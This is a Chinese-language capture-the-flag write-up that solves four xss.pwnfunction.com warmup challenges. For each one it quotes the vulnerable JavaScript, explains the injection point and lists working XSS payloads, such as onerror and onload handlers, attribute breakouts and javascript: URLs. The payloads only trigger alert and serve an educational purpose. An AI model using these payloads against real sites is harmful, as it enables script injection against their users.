# XSS

## 链接

* [XSS Cheat Sheet](https://www.mdeditor.tw/pl/ppwu/zh-tw)
* [PortSwigger Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

## xss.pwnfunction.com 题目解析

1. ma-spaghet!

```html
<!-- Challenge -->
<h2 id="spaghet"></h2>
<script>
    spaghet.innerHTML = (new URL(location).searchParams.get('somebody') || "Somebody") + " Toucha Ma Spaghet!"
</script>
```

**问题分析**

Client side script 将URL中的somebody参数作为**spaghet**的innerHTML。因此，只要构造一个合法的HTML标签来触发Javascript代码即可。
由于<script>标签只能作为<head>或者<body>的子节点，这里可以考虑使用<svg>或者<img>标签。

**答案**

* <img src="x" onerror="alert(1337)">
* <svg onload="alert(1337)"/>

2. Jefff

题目链接：https://xss.pwnfunction.com/warmups/jefff/

```html
<!-- Challenge -->
<h2 id="maname"></h2>
<script>
    let jeff = (new URL(location).searchParams.get('jeff') || "JEFFF")
    let ma = ""
    eval(`ma = "Ma name ${jeff}"`)
    setTimeout(_ => {
        maname.innerText = ma
    }, 1000)
</script>
```

**问题分析**

Client side script 将URL中的jeff参数注入到一段代码中，然后执行这段代码。这里使用了模版字面量
（[Template literals](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals)）。
jeff参数被编码成一段字符串与"Ma name "连接。因此，如果想要注入代码并获得执行，需要break这段字符串。

**答案**

* \"-alert(1237)-\"

这里使用转义字符来插入引号，插入减号（也可以插入加号，但是要做URL编码）来构造一段合法的js代码（ma = "Ma name " - alert(1337) - ""）。

3. Ugandan Knuckles

题目链接：https://xss.pwnfunction.com/warmups/da-wey/

```html
<!-- Challenge -->
<div id="uganda"></div>
<script>
    let wey = (new URL(location).searchParams.get('wey') || "do you know da wey?");
    wey = wey.replace(/[<>]/g, '')
    uganda.innerHTML = `<input type="text" placeholder="${wey}" class="form-control">`
</script>
```

**问题分析**

Client side script将参数 wey 插入到<input>中国作为属性placeholder的值。因此，需要break引号，并插入一个新的属性，使其触发alert函数。

**答案**

* " onfocus=alert(1337) autofocus="
* " onclick="alert(1337)

4. Ricardo Milos

题目链接：https://xss.pwnfunction.com/warmups/ricardo/

```html
<!-- Challenge -->
<form id="ricardo" method="GET">
    <input name="milos" type="text" class="form-control" placeholder="True" value="True">
</form>
<script>
    ricardo.action = (new URL(location).searchParams.get('ricardo') || '#')
    setTimeout(_ => {
        ricardo.submit()
    }, 2000)
</script>
```

**问题分析**

<script>标签中的代码将 ricardo 参数赋值给 ricardo form 的 action。[HTML Form](https://www.w3schools.com/tags/att_form_action.asp)
的 action 属性是一个URL。如果它包含了javascript协议号，则其后的代码会被浏览器执行，可参考
[RULE#7 - Avoid Javascript URLs](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)。

**答案**

* javascript:alert(1337)

